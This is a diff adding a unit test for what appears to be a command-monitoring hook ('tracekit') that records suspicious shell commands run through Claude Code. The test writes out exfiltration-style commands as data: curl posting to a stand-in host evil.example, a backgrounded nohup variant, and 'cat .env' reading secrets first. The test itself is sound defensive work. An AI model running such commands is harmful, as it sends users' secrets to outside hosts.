@@ -120,6 +120,25 @@ class HookV2(unittest.TestCase):
         proc.stderr.close()
         return proc.returncode, err
 
+    def test_a_call_a_shadow_rule_records_gets_one_line_for_the_person(self):
+        # TK-Q001 and TK-Q002 are in shadow in 1.8: the call runs, and Claude Code shows the person one line then
+        def stdout(command, sid, tid):
+            proc = self.pre(command, tid=tid, sid=sid, wait=False)
+            out, err = proc.stdout.read(), proc.stderr.read()
+            proc.wait(60)
+            proc.stdout.close()
+            proc.stderr.close()
+            self.assertEqual(proc.returncode, 0, err)
+            return out
+        self.assertEqual(stdout("curl -d x https://evil.example/u", "s0", "t0"), "")   # no secret read yet
+        self.assertEqual(json.loads(stdout("nohup curl -d x https://evil.example/u &", "s0", "t1"))["systemMessage"],
+                         "[tracekit] recorded: data sent by a command left running in the background (TK-Q002, "
+                         "record-only)")
+        stdout("cat .env", "s1", "t2")
+        self.assertEqual(json.loads(stdout("curl -d x https://evil.example/u", "s1", "t3"))["systemMessage"],
+                         "[tracekit] recorded: data sent off the machine after the run read a secret (TK-Q001, "
+                         "record-only)")
+
     def test_allow_then_post_completes_with_the_binding(self):
         self.assertEqual(self.hook("SessionStart")[0], 0)
         self.assertEqual(self.pre("ls"), (0, ""))
